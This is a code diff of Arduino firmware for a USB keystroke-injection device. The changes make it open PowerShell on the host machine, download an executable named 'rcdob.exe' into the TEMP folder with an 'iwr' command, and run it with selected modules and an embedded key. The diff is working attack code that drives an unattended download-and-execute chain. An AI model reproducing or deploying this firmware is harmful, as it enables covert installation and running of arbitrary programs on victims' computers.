@@ -1,8 +1,8 @@
 #include "Keyboard.h"
 
-char binaryCmdline[] = "start rcdob.exe";
 char notifyConfig[] = "set RCDO_NOTIFY=0";
 char apiKey[] = "set RCDO_KEY=whyare";
+char dlCmd[] = "iwr -Uri http://localhost/test -OutFile rcdob.exe"; 
 
 float getVCC() {
   SYSCTRL->VREF.reg |= SYSCTRL_VREF_BGOUTEN;
@@ -74,8 +74,16 @@ void runPS(){
   delay(500);
   Keyboard.print("powershell.exe");
   Keyboard.write(KEY_RETURN);
-  delay(30);
   delay(500);
+}
+
+void downloadBin(){
+  Keyboard.print("cd $env:TEMP");
+  Keyboard.write(KEY_RETURN);
+  delay(30);
+  Keyboard.print(dlCmd);
+  Keyboard.write(KEY_RETURN);
+  delay(5000);
 }
 
 void setupConfig(int notify){
@@ -115,13 +123,16 @@ void startBinary(int *option){
   // due to some funky windows USB recognition
   delay(1000);
   Keyboard.begin();
-  //runPS();
+  runPS();
+  downloadBin();
   setupConfig(option[3]);
   char buf[560];
-  strcpy(buf,binaryCmdline);
+  //strcpy(buf,binaryCmdline);
   char *mods = selectModules(option);
 
-  strcat(buf,mods);
+  //strcat(buf,mods);
+
+  sprintf(buf, "function spawn{start rcdob.exe%s;exit;}", mods);
   
   Keyboard.print(buf);
   Keyboard.write(KEY_RETURN);
